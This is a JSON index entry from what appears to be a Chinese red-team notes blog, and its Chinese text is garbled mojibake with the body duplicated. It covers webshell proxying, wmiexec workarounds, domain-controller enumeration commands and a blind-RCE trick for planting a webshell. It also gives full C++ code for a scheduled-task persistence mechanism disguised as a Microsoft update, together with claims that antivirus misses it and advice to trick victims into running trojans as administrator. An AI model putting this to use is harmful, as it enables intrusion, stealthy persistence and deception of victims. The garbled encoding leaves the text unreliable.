        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/%E4%B8%80%E4%BA%9B%E5%86%85%E7%BD%91%E5%9C%BA%E6%99%AF%E5%8F%8A%E5%85%B6%E8%A7%A3%E6%B3%95/",
        "content": "ä¸€äº›æ¸—é€åœºæ™¯\u0026amp;è§£å†³æ–¹æ¡ˆ webshellä»£ç† Qï¼šä½ æ‹¿äº†æœºå™¨shellï¼Œåªæœ‰80ç«¯å£å…¥ç½‘å‡ºç½‘ï¼Œ80ç«¯å£è¿˜è¢«å ç”¨ä¸èƒ½frpä½ æ€ä¹ˆåŠ\nAï¼š80ä¸€èˆ¬éƒ½æ˜¯webæœåŠ¡ï¼Œå¯ä»¥è€ƒè™‘webshellåšä»£ç†ï¼Œæœ‰ä¸¤ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨ï¼šsuo5ã€neo-rgeorg\nå¤§æ–‡ä»¶ä¸‹è½½ webshellè¿ä¸Šåï¼Œå¦‚æœæœ‰æƒ³ä¸‹è½½çš„å¤§æ–‡ä»¶ï¼Œwebshellè¿æ¥å·¥å…·åˆä¸æ”¯æŒå¤§æ–‡ä»¶æˆ–æ–‡ä»¶ä¸‹è½½è¿‡æ…¢ï¼Œå¯ä»¥å°†å¤§æ–‡ä»¶ç§»åŠ¨åˆ°webç›®å½•ï¼Œç„¶åæµè§ˆå™¨è®¿é—®è¿›è¡Œä¸‹è½½ï¼Œæˆ–è€…ç”¨ä¸»æœºä¸Šæœ‰çš„è¯­è¨€å»èµ·ä¸€ä¸ªhttp.serverï¼Œä¹Ÿç”¨æµè§ˆå™¨ä¸‹è½½\npsï¼šæ­¤æ—¶é€šè¿‡æµè§ˆå™¨ä¸‹è½½ï¼Œå¦‚æœè¿˜æ…¢ï¼Œå¯ä»¥ä¸Šè¿…é›·\nwmiexec impacketçš„wmiexecä½¿ç”¨æ—¶çš„å‡ ç§æƒ…å†µï¼š\nCOMè¢«ban å¦‚æœå…³é—­äº†è¿œç¨‹çš„COMç»„ä»¶è°ƒç”¨ï¼Œå°±æ— æ³•æ‰§è¡Œwmi\ncomç»„ä»¶æ˜¯æ”¯æ’‘wmiæ‰§è¡Œå‘½ä»¤çš„ç»„ä»¶ï¼Œè¢«ç¦ç”¨äº†ï¼Œå°±ç®—é€šä¿¡å±‚é¢å†æ€ä¹ˆæ¢ï¼Œä¹Ÿæ²¡æ³•æœ€ç»ˆæˆåŠŸæ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰è§£å†³æ–¹æ¡ˆ\n445ç«¯å£è¢«banä½†135è¿˜åœ¨ å› ä¸ºåœ¨wmiexecä¸­ï¼Œ445ç«¯å£åªç”¨äºå›æ˜¾å‘½ä»¤æ‰§è¡Œç»“æœï¼Œæ‰€ä»¥å¹¶ä¸å½±å“æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨-nooutputå‚æ•°é€‰æ‹©æ— å›æ˜¾æ‰§è¡Œæ¥bypass\n135ï¼Œ445éƒ½æ‰“å¼€äº†ï¼Œä½†æ¡Œé¢ç«¯æœ‰æ€è½¯ å¾…æ›´æ–°\nåªæœ‰135ç«¯å£çš„å…¶ä»–åˆ©ç”¨æ€è·¯ æ“ä½œæ³¨å†Œè¡¨\nè®¡åˆ’ä»»åŠ¡é©»ç•™ è¿™é‡Œè®¡åˆ’ä»»åŠ¡ç”¨æ¥csä¸Šçº¿ååšé©»ç•™\nQï¼šä¸Šçº¿åšé©»ç•™ï¼Œè¢«æ€è½¯ï¼ˆæ¯”å¦‚360å®‰å…¨å¤§è„‘ï¼‰banæ‰æ€ä¹ˆåŠ\n1.è¿›ç¨‹æ³¨å…¥ å¯ä»¥å°è¯•è¿›ç¨‹æ³¨å…¥ï¼Œæ³¨å…¥åˆ°ç™½è¿›ç¨‹ï¼ˆæ¯”å¦‚OneDriveï¼‰ä¸­æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œè¿›ç¨‹æ³¨å…¥çš„å¥½å¤„å°±æ˜¯å¯ä»¥ç›´æ¥ä»¥æ™®é€šæƒé™æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„360ç¯å¢ƒéƒ½å¯ä»¥æ³¨å…¥å¹¶ä¸”æˆåŠŸæ·»åŠ çš„ï¼Œå®æˆ˜ä¸­ä¹Ÿé‡åˆ°è¿‡ä¸èƒ½æ·»åŠ çš„æƒ…å†µ\n2.è°ƒç”¨Windowsæœ¬èº«çš„æ¥å£æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡ å®˜æ–¹demoï¼šç™»å½•è§¦å‘å™¨ç¤ºä¾‹ (C++) - Win32 apps | Microsoft Learn\nç›´æ¥é™„ä¸Šc++ä»£ç :\n#define _WIN32_DCOM #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;comdef.h\u0026gt; // Include the task header file. #include \u0026lt;taskschd.h\u0026gt; #pragma comment(lib, \u0026#34;taskschd.lib\u0026#34;) #pragma comment(lib, \u0026#34;comsupp.lib\u0026#34;) using namespace std; int __cdecl wmain() { // ------------------------------------------------------ // Initialize COM.åˆå§‹åŒ–com HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // Set general COM security levels. è®¾ç½®å®‰å…¨ç­‰çº§ hr = CoInitializeSecurity( NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL); // ------------------------------------------------------ // Create a name for the task. ç»™è®¡åˆ’ä»»åŠ¡å‘½å LPCWSTR wszTaskName = L\u0026#34;Window Microsoft Update\u0026#34;; // Get the Windows directory and set the path to Notepad.exe. è®¾ç½®windowsçš„æ‰§ è¡Œè·¯å¾„ wstring wstrExecutablePath = L\u0026#34;cmd /c whoami\u0026#34;; // Create an instance of the Task Service. åˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡å®ä¾‹ ITaskService* pService = NULL; hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)\u0026amp;pService); // Connect to the task service. è¿æ¥è®¡åˆ’ä»»åŠ¡æœåŠ¡ hr = pService-\u0026gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); // Get the pointer to the root task folder. è·å–æŒ‡å‘æ ¹ä»»åŠ¡æ–‡ä»¶å¤¹çš„æŒ‡é’ˆ // This folder will hold the new task that is registered. è¿™ä¸ªæ–‡ä»¶å¤¹èƒ½å¤Ÿå®¹çº³å·² ç»æ³¨å†Œçš„è®¡åˆ’ä»»åŠ¡ ITaskFolder* pRootFolder = NULL; hr = pService-\u0026gt;GetFolder(_bstr_t(L\u0026#34;\\\\\u0026#34;), \u0026amp;pRootFolder); // If the same task exists, remove it. å¦‚æœç›¸åŒçš„ä»»åŠ¡å­˜åœ¨ å°±ç§»é™¤å®ƒ pRootFolder-\u0026gt;DeleteTask(_bstr_t(wszTaskName), 0); // Create the task builder object to create the task. åˆ›å»ºä»»åŠ¡å¯¹è±¡æ¥åˆ›å»ºä»»åŠ¡ ITaskDefinition* pTask = NULL; hr = pService-\u0026gt;NewTask(0, \u0026amp;pTask); pService-\u0026gt;Release(); // COM clean up. Pointer is no longer used. // ------------------------------------------------------ // Get the registration info for setting the identification. è·å–æ³¨å†Œä¿¡æ¯ç»™è®¾å®š å®šä¹‰å™¨ IRegistrationInfo* pRegInfo = NULL; hr = pTask-\u0026gt;get_RegistrationInfo(\u0026amp;pRegInfo); // è·å–æ³¨å†Œä¿¡æ¯ hr = pRegInfo-\u0026gt;put_Author(_bstr_t(L\u0026#34;fucku\u0026#34;)); // æ”¾ç½®ä½œè€…ä¿¡æ¯ pRegInfo-\u0026gt;Release(); // Create the settings for the task åˆ›å»ºä»»åŠ¡è®¾å®š ITaskSettings* pSettings = NULL; hr = pTask-\u0026gt;get_Settings(\u0026amp;pSettings); if (FAILED(hr)) { printf(\u0026#34;\\nCannot get settings pointer: %x\u0026#34;, hr); pRootFolder-\u0026gt;Release(); pTask-\u0026gt;Release(); CoUninitialize(); return 1; } // Set setting values for the task. ç»™è®¡åˆ’ä»»åŠ¡è®¾ç½®å…·ä½“çš„å€¼ hr = pSettings-\u0026gt;put_StartWhenAvailable(VARIANT_TRUE); pSettings-\u0026gt;Release(); // ------------------------------------------------------ // Get the trigger collection to insert the boot trigger. è·å–è§¦å‘å™¨é›†åˆæ¥æ’å…¥ å¯åŠ¨è§¦å‘å™¨ ITriggerCollection* pTriggerCollection = NULL; hr = pTask-\u0026gt;get_Triggers(\u0026amp;pTriggerCollection); // Add the boot trigger to the task. ç»™ä»»åŠ¡å¢åŠ å¯åŠ¨è§¦å‘å™¨ ITrigger* pTrigger = NULL; hr = pTriggerCollection-\u0026gt;Create(TASK_TRIGGER_BOOT, \u0026amp;pTrigger);// åˆ›å»ºä»»åŠ¡è§¦å‘å™¨ pTriggerCollection-\u0026gt;Release(); IBootTrigger* pBootTrigger = NULL; hr = pTrigger-\u0026gt;QueryInterface(// æŸ¥è¯¢æ¥å£ IID_IBootTrigger, (void**)\u0026amp;pBootTrigger); pTrigger-\u0026gt;Release(); hr = pBootTrigger-\u0026gt;put_Id(_bstr_t(L\u0026#34;Trigger1\u0026#34;));//æŠŠidæ”¾è¿›å» // Delay the task to start 30 seconds after system start. * å»¶è¿Ÿ30såæ‰§è¡Œ hr = pBootTrigger-\u0026gt;put_Delay(_bstr_t(L\u0026#34;PT30S\u0026#34;)); pBootTrigger-\u0026gt;Release(); // ------------------------------------------------------ // Add an Action to the task. This task will execute Notepad.exe. IActionCollection* pActionCollection = NULL; // Get the task action collection pointer. hr = pTask-\u0026gt;get_Actions(\u0026amp;pActionCollection); // Create the action, specifying it as an executable action. IAction* pAction = NULL; hr = pActionCollection-\u0026gt;Create(TASK_ACTION_EXEC, \u0026amp;pAction); pActionCollection-\u0026gt;Release(); IExecAction* pExecAction = NULL; // QI for the executable task pointer. hr = pAction-\u0026gt;QueryInterface( IID_IExecAction, (void**)\u0026amp;pExecAction); pAction-\u0026gt;Release(); // Set the path of the executable hr = pExecAction-\u0026gt;put_Path(_bstr_t(wstrExecutablePath.c_str())); pExecAction-\u0026gt;Release(); // ------------------------------------------------------ // Save the task in the root folder. IRegisteredTask* pRegisteredTask = NULL; VARIANT varPassword; varPassword.vt = VT_EMPTY; hr = pRootFolder-\u0026gt;RegisterTaskDefinition( _bstr_t(wszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L\u0026#34;Local Service\u0026#34;), varPassword, TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L\u0026#34;\u0026#34;), \u0026amp;pRegisteredTask); printf(\u0026#34;\\n Success! Task successfully registered. \u0026#34;); // Clean up. pRootFolder-\u0026gt;Release(); pTask-\u0026gt;Release(); pRegisteredTask-\u0026gt;Release(); CoUninitialize(); return 0; } 360å’Œdefenderéƒ½ä¸ä¼šæŠ¥æ¯’ï¼Œä½†éœ€è¦ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œexeï¼Œè¿™ä¸€ç‚¹å¯ä»¥ä»ç‚¹å‡»å…æ€é©¬ä¸Šçº¿ä¸Šä¸‹åŠŸå¤«ï¼Œè¯±ä½¿å¯¹æ–¹ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œæœ¨é©¬\næ‰¾åŸŸæ§ è¿™é‡Œæ‰€è°“çš„æ‰¾åˆ°åŸŸæ§ï¼Œä¸»è¦æ˜¯æ‹¿åˆ°ä¸‰è¦ç´ ï¼š\n1ã€åŸŸæ§çš„æœºå™¨çš„åå­—\n2ã€åŸŸçš„åå­—\n3ã€åŸŸæ§çš„æœºå™¨å¯¹åº”çš„åŸŸå†…çš„ ip\næ¥ä¸‹æ¥ä¸€äº›åœºæ™¯ï¼š\nåœºæ™¯1 è¿›å…¥å†…ç½‘ï¼Œæœ‰åŸŸï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥æŸ¥æ‰¾åŸŸæ§çš„æœºå™¨åå­—\nä½¿ç”¨å‘½ä»¤ï¼š\nnet group â€œDomain Controllersâ€ /Domain #æŸ¥æ‰¾åŸŸæ§æœºå™¨çš„åå­— å‘ç°æŸ¥æ‰¾ä¸äº†ï¼Œä½†å¯èƒ½çˆ†å‡ºåŸŸçš„åå­—ï¼š\nè¿™é‡Œå†å°è¯•pingè¯¥åŸŸï¼š\næ‹¿åˆ°äº†IP\nåœºæ™¯2 è¿›å…¥å†…ç½‘ï¼Œé€šè¿‡DNSæœåŠ¡å™¨ä¿¡æ¯æ‰¾åˆ°äº†åŸŸæ§çš„åå­—ï¼Œä½†æ˜¯pingåŸŸæ§çš„æ—¶å€™å‘ç°å¹¶ä¸èƒ½å¾—åˆ°è‡ªå·±æƒ³è¦çš„åŸŸæ§ipï¼ˆæ¯”å¦‚pingå‡ºæ¥æ˜¯ä¸ªå¤–ç½‘IPï¼‰\næ–¹æ³•ä¸€\nå°è¯•æ‰¾å†…ç½‘çš„dnsæœåŠ¡å™¨çš„ipï¼Œä¹Ÿåœ¨ ipconfig /all ç»“æœé‡Œé¢\næ–¹æ³•äºŒ\nä½¿ç”¨nltestï¼š\nnltest /dsgetdc:åŸŸåç§° å‘½ä»¤æ‰§è¡Œç»“æœä¸­å¯ä»¥å¾—åˆ°IPï¼š\nä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰æ—¶å€™åœ¨æ‹¿åˆ° webshell å…¶å®å¹¶ä¸èƒ½ç”¨ï¼Œnltest.exe è¿™ä¸ªæ–‡ä»¶æ˜¯åœ¨ Windows/System32 æ–‡ä»¶å¤¹é‡Œé¢çš„ï¼Œä½†æ˜¯å¦‚æœé€šè¿‡ webshell æ¥å¯»æ‰¾æ˜¯æ‰¾ä¸åˆ°çš„\nï¼ˆä¹Ÿå¯ä»¥å°è¯•è‡ªå·±ä¸Šä¼ ä¸€ä¸ªnltestä½¿ç”¨ï¼Œæœ‰æ¦‚ç‡æˆåŠŸï¼‰\nå€¼å¾—è®°ä½çš„åŸŸå†…å¸¸ç”¨å‘½ä»¤ å¸¸ç”¨ã€é¢è¯•å¸¸é—®\nipconfig /all #å¯ä»¥æŸ¥çœ‹åŸŸæ§åå­— ç„¶åæ‰¾åˆ° dns æœåŠ¡å™¨ ç„¶åæ‰¾åˆ°åŸŸæ§ net view /domain:\u0026lt;åŸŸå\u0026gt; #å¯ä»¥æŸ¥çœ‹åŸŸå†…æœºå™¨ net group \u0026#34;domain users\u0026#34; /domain #åŸŸå†…ç”¨æˆ·åˆ—è¡¨ net user /domain #çŸ­ç‰ˆåŸŸå†…ç”¨æˆ·åˆ—è¡¨ï¼Œä½†æ˜¯éœ€è¦ rpc å¼€å¯ net group \u0026#34;domain admins\u0026#34; /domain #åŸŸå†…ç®¡ç†å‘˜ç”¨æˆ·åˆ—è¡¨ RCEæ— å›æ˜¾ã€ä¸å‡ºç½‘ [å‘½ä»¤æ‰§è¡Œæ¼æ´æ— ]å›æ˜¾[ä¸]å‡ºç½‘åˆ©ç”¨æŠ€å·§ | CN-SEC ä¸­æ–‡ç½‘\nä¸€ä¸ªä¸»è¦æ€è·¯å°±æ˜¯å†™æ–‡ä»¶ï¼Œæ¯”å¦‚ï¼šå¦‚æœæ˜¯å½“å‰webç›®å½•æŸä¸ªæ–‡ä»¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥å°†ç»“æœå†™å…¥å½“å‰ç›®å½•çš„ä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¦‚æœä¸å¥½ç¡®å®šwebè·¯å¾„ä»¥åŠæ‰§è¡Œå‘½ä»¤çš„æ–‡ä»¶ä½ç½®ï¼Œå¯ä»¥å°è¯•æ‰¾åˆ°ä¸€ä¸ªç‰¹å¾æ–‡ä»¶æ¯”å¦‚å‰ç«¯ä¼šåŠ è½½çš„jsç„¶åæ‰§è¡Œå‘½ä»¤å°†ç»“æœè¾“å‡ºåˆ°å’Œè¯¥jsæ–‡ä»¶åŒç›®å½•ï¼Œä»¥linuxä¸ºä¾‹:\nfind . -type f -name 1.js|while read f;do sh -c \u0026#39;id;pwd;hostname;/sbin/ifconfig\u0026#39; \u0026gt;$(dirname $f)/test.txt;done åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–æ–‡ä»¶æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œç»“æœï¼Œé‚£ä¹ˆåŒç†ï¼Œå¯ä»¥å®šä½webç›®å½•å¹¶å†™å…¥webshellæ¥å®ç°æœ‰å›æ˜¾äº†\nè´Ÿè½½å‡è¡¡ Qï¼šç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œèƒ½æ‹¿shellï¼Œä½†æ‰§è¡Œä¸€ä¸ªå‘½ä»¤åæ¬¡åªæœ‰ä¸€æ¬¡æˆåŠŸäº†ï¼Œæ‰§è¡Œå‡ æ¬¡ipconfigè¿”å›çš„åœ°å€éƒ½ä¸ä¸€æ ·ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¦‚ä½•ç»•è¿‡\nAï¼šè¿™æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå«åšè´Ÿè½½å‡è¡¡ï¼Œä½ çš„å‘½ä»¤ä¼šè°ƒåº¦åˆ°å…¶ä»–çš„æœºå™¨ä¸Šæ‰§è¡Œï¼Œè°ƒåº¦å™¨æ ¹æ®è´Ÿè½½éšæœºè°ƒåº¦æ‰§è¡Œï¼Œè¿™ç§æƒ…å†µå°±ä¼šå¯¼è‡´ä½ ä»£ç†åšä¸èµ·æ¥ï¼Œè€Œä¸”æ–‡ä»¶ä¼ ä¸Šå»ä¹Ÿä¸å®Œæ•´\nä¸‹é¢æ˜¯æˆ‘å­¦ä¹ æ—¶è®°å½•çš„å¤„ç†åŠæ³•ï¼šé’ˆå¯¹è´Ÿè½½å‡è¡¡çš„webshellä¸ä»£ç†æ€è·¯\n",
        "summary": "ä¸€äº›æ¸—é€åœºæ™¯\u0026amp;è§£å†³æ–¹æ¡ˆ webshellä»£ç† Qï¼šä½ æ‹¿äº†æœºå™¨shellï¼Œåªæœ‰80ç«¯å£å…¥ç½‘å‡ºç½‘ï¼Œ80ç«¯å£è¿˜è¢«å ç”¨ä¸èƒ½frpä½ æ€ä¹ˆåŠ\nAï¼š80ä¸€èˆ¬éƒ½æ˜¯webæœåŠ¡ï¼Œå¯ä»¥è€ƒè™‘webshellåšä»£ç†ï¼Œæœ‰ä¸¤ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨ï¼šsuo5ã€neo-rgeorg\nå¤§æ–‡ä»¶ä¸‹è½½ webshellè¿ä¸Šåï¼Œå¦‚æœæœ‰æƒ³ä¸‹è½½çš„å¤§æ–‡ä»¶ï¼Œwebshellè¿æ¥å·¥å…·åˆä¸æ”¯æŒå¤§æ–‡ä»¶æˆ–æ–‡ä»¶ä¸‹è½½è¿‡æ…¢ï¼Œå¯ä»¥å°†å¤§æ–‡ä»¶ç§»åŠ¨åˆ°webç›®å½•ï¼Œç„¶åæµè§ˆå™¨è®¿é—®è¿›è¡Œä¸‹è½½ï¼Œæˆ–è€…ç”¨ä¸»æœºä¸Šæœ‰çš„è¯­è¨€å»èµ·ä¸€ä¸ªhttp.serverï¼Œä¹Ÿç”¨æµè§ˆå™¨ä¸‹è½½\npsï¼šæ­¤æ—¶é€šè¿‡æµè§ˆå™¨ä¸‹è½½ï¼Œå¦‚æœè¿˜æ…¢ï¼Œå¯ä»¥ä¸Šè¿…é›·\nwmiexec impacketçš„wmiexecä½¿ç”¨æ—¶çš„å‡ ç§æƒ…å†µï¼š\nCOMè¢«ban å¦‚æœå…³é—­äº†è¿œç¨‹çš„COMç»„ä»¶è°ƒç”¨ï¼Œå°±æ— æ³•æ‰§è¡Œwmi\ncomç»„ä»¶æ˜¯æ”¯æ’‘wmiæ‰§è¡Œå‘½ä»¤çš„ç»„ä»¶ï¼Œè¢«ç¦ç”¨äº†ï¼Œå°±ç®—é€šä¿¡å±‚é¢å†æ€ä¹ˆæ¢ï¼Œä¹Ÿæ²¡æ³•æœ€ç»ˆæˆåŠŸæ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰è§£å†³æ–¹æ¡ˆ\n445ç«¯å£è¢«banä½†135è¿˜åœ¨ å› ä¸ºåœ¨wmiexecä¸­ï¼Œ445ç«¯å£åªç”¨äºå›æ˜¾å‘½ä»¤æ‰§è¡Œç»“æœï¼Œæ‰€ä»¥å¹¶ä¸å½±å“æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨-nooutputå‚æ•°é€‰æ‹©æ— å›æ˜¾æ‰§è¡Œæ¥bypass\n135ï¼Œ445éƒ½æ‰“å¼€äº†ï¼Œä½†æ¡Œé¢ç«¯æœ‰æ€è½¯ å¾…æ›´æ–°\nåªæœ‰135ç«¯å£çš„å…¶ä»–åˆ©ç”¨æ€è·¯ æ“ä½œæ³¨å†Œè¡¨\nè®¡åˆ’ä»»åŠ¡é©»ç•™ è¿™é‡Œè®¡åˆ’ä»»åŠ¡ç”¨æ¥csä¸Šçº¿ååšé©»ç•™\nQï¼šä¸Šçº¿åšé©»ç•™ï¼Œè¢«æ€è½¯ï¼ˆæ¯”å¦‚360å®‰å…¨å¤§è„‘ï¼‰banæ‰æ€ä¹ˆåŠ\n1.è¿›ç¨‹æ³¨å…¥ å¯ä»¥å°è¯•è¿›ç¨‹æ³¨å…¥ï¼Œæ³¨å…¥åˆ°ç™½è¿›ç¨‹ï¼ˆæ¯”å¦‚OneDriveï¼‰ä¸­æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œè¿›ç¨‹æ³¨å…¥çš„å¥½å¤„å°±æ˜¯å¯ä»¥ç›´æ¥ä»¥æ™®é€šæƒé™æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„360ç¯å¢ƒéƒ½å¯ä»¥æ³¨å…¥å¹¶ä¸”æˆåŠŸæ·»åŠ çš„ï¼Œå®æˆ˜ä¸­ä¹Ÿé‡åˆ°è¿‡ä¸èƒ½æ·»åŠ çš„æƒ…å†µ\n2.è°ƒç”¨Windowsæœ¬èº«çš„æ¥å£æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡ å®˜æ–¹demoï¼šç™»å½•è§¦å‘å™¨ç¤ºä¾‹ (C++) - Win32 apps | Microsoft Learn\nç›´æ¥é™„ä¸Šc++ä»£ç :\n#define _WIN32_DCOM #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;comdef.h\u0026gt; // Include the task header file. #include \u0026lt;taskschd.h\u0026gt; #pragma comment(lib, \u0026#34;taskschd.lib\u0026#34;) #pragma comment(lib, \u0026#34;comsupp.lib\u0026#34;) using namespace std; int __cdecl wmain() { // ------------------------------------------------------ // Initialize COM.åˆå§‹åŒ–com HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // Set general COM security levels. è®¾ç½®å®‰å…¨ç­‰çº§ hr = CoInitializeSecurity( NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL); // ------------------------------------------------------ // Create a name for the task. ç»™è®¡åˆ’ä»»åŠ¡å‘½å LPCWSTR wszTaskName = L\u0026#34;Window Microsoft Update\u0026#34;; // Get the Windows directory and set the path to Notepad.exe. è®¾ç½®windowsçš„æ‰§ è¡Œè·¯å¾„ wstring wstrExecutablePath = L\u0026#34;cmd /c whoami\u0026#34;; // Create an instance of the Task Service. åˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡å®ä¾‹ ITaskService* pService = NULL; hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)\u0026amp;pService); // Connect to the task service. è¿æ¥è®¡åˆ’ä»»åŠ¡æœåŠ¡ hr = pService-\u0026gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); // Get the pointer to the root task folder. è·å–æŒ‡å‘æ ¹ä»»åŠ¡æ–‡ä»¶å¤¹çš„æŒ‡é’ˆ // This folder will hold the new task that is registered. è¿™ä¸ªæ–‡ä»¶å¤¹èƒ½å¤Ÿå®¹çº³å·² ç»æ³¨å†Œçš„è®¡åˆ’ä»»åŠ¡ ITaskFolder* pRootFolder = NULL; hr = pService-\u0026gt;GetFolder(_bstr_t(L\u0026#34;\\\\\u0026#34;), \u0026amp;pRootFolder); // If the same task exists, remove it. å¦‚æœç›¸åŒçš„ä»»åŠ¡å­˜åœ¨ å°±ç§»é™¤å®ƒ pRootFolder-\u0026gt;DeleteTask(_bstr_t(wszTaskName), 0); // Create the task builder object to create the task. åˆ›å»ºä»»åŠ¡å¯¹è±¡æ¥åˆ›å»ºä»»åŠ¡ ITaskDefinition* pTask = NULL; hr = pService-\u0026gt;NewTask(0, \u0026amp;pTask); pService-\u0026gt;Release(); // COM clean up. Pointer is no longer used. // ------------------------------------------------------ // Get the registration info for setting the identification. è·å–æ³¨å†Œä¿¡æ¯ç»™è®¾å®š å®šä¹‰å™¨ IRegistrationInfo* pRegInfo = NULL; hr = pTask-\u0026gt;get_RegistrationInfo(\u0026amp;pRegInfo); // è·å–æ³¨å†Œä¿¡æ¯ hr = pRegInfo-\u0026gt;put_Author(_bstr_t(L\u0026#34;fucku\u0026#34;)); // æ”¾ç½®ä½œè€…ä¿¡æ¯ pRegInfo-\u0026gt;Release(); // Create the settings for the task åˆ›å»ºä»»åŠ¡è®¾å®š ITaskSettings* pSettings = NULL; hr = pTask-\u0026gt;get_Settings(\u0026amp;pSettings); if (FAILED(hr)) { printf(\u0026#34;\\nCannot get settings pointer: %x\u0026#34;, hr); pRootFolder-\u0026gt;Release(); pTask-\u0026gt;Release(); CoUninitialize(); return 1; } // Set setting values for the task. ç»™è®¡åˆ’ä»»åŠ¡è®¾ç½®å…·ä½“çš„å€¼ hr = pSettings-\u0026gt;put_StartWhenAvailable(VARIANT_TRUE); pSettings-\u0026gt;Release(); // ------------------------------------------------------ // Get the trigger collection to insert the boot trigger. è·å–è§¦å‘å™¨é›†åˆæ¥æ’å…¥ å¯åŠ¨è§¦å‘å™¨ ITriggerCollection* pTriggerCollection = NULL; hr = pTask-\u0026gt;get_Triggers(\u0026amp;pTriggerCollection); // Add the boot trigger to the task. ç»™ä»»åŠ¡å¢åŠ å¯åŠ¨è§¦å‘å™¨ ITrigger* pTrigger = NULL; hr = pTriggerCollection-\u0026gt;Create(TASK_TRIGGER_BOOT, \u0026amp;pTrigger);// åˆ›å»ºä»»åŠ¡è§¦å‘å™¨ pTriggerCollection-\u0026gt;Release(); IBootTrigger* pBootTrigger = NULL; hr = pTrigger-\u0026gt;QueryInterface(// æŸ¥è¯¢æ¥å£ IID_IBootTrigger, (void**)\u0026amp;pBootTrigger); pTrigger-\u0026gt;Release(); hr = pBootTrigger-\u0026gt;put_Id(_bstr_t(L\u0026#34;Trigger1\u0026#34;));//æŠŠidæ”¾è¿›å» // Delay the task to start 30 seconds after system start. * å»¶è¿Ÿ30såæ‰§è¡Œ hr = pBootTrigger-\u0026gt;put_Delay(_bstr_t(L\u0026#34;PT30S\u0026#34;)); pBootTrigger-\u0026gt;Release(); // ------------------------------------------------------ // Add an Action to the task. This task will execute Notepad.exe. IActionCollection* pActionCollection = NULL; // Get the task action collection pointer. hr = pTask-\u0026gt;get_Actions(\u0026amp;pActionCollection); // Create the action, specifying it as an executable action. IAction* pAction = NULL; hr = pActionCollection-\u0026gt;Create(TASK_ACTION_EXEC, \u0026amp;pAction); pActionCollection-\u0026gt;Release(); IExecAction* pExecAction = NULL; // QI for the executable task pointer. hr = pAction-\u0026gt;QueryInterface( IID_IExecAction, (void**)\u0026amp;pExecAction); pAction-\u0026gt;Release(); // Set the path of the executable hr = pExecAction-\u0026gt;put_Path(_bstr_t(wstrExecutablePath.c_str())); pExecAction-\u0026gt;Release(); // ------------------------------------------------------ // Save the task in the root folder. IRegisteredTask* pRegisteredTask = NULL; VARIANT varPassword; varPassword.vt = VT_EMPTY; hr = pRootFolder-\u0026gt;RegisterTaskDefinition( _bstr_t(wszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L\u0026#34;Local Service\u0026#34;), varPassword, TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L\u0026#34;\u0026#34;), \u0026amp;pRegisteredTask); printf(\u0026#34;\\n Success! Task successfully registered. \u0026#34;); // Clean up. pRootFolder-\u0026gt;Release(); pTask-\u0026gt;Release(); pRegisteredTask-\u0026gt;Release(); CoUninitialize(); return 0; } 360å’Œdefenderéƒ½ä¸ä¼šæŠ¥æ¯’ï¼Œä½†éœ€è¦ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œexeï¼Œè¿™ä¸€ç‚¹å¯ä»¥ä»ç‚¹å‡»å…æ€é©¬ä¸Šçº¿ä¸Šä¸‹åŠŸå¤«ï¼Œè¯±ä½¿å¯¹æ–¹ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œæœ¨é©¬\n"
    }
,
    {
        "title": "äº‘åŸç”ŸåŸºç¡€çŸ¥è¯†",
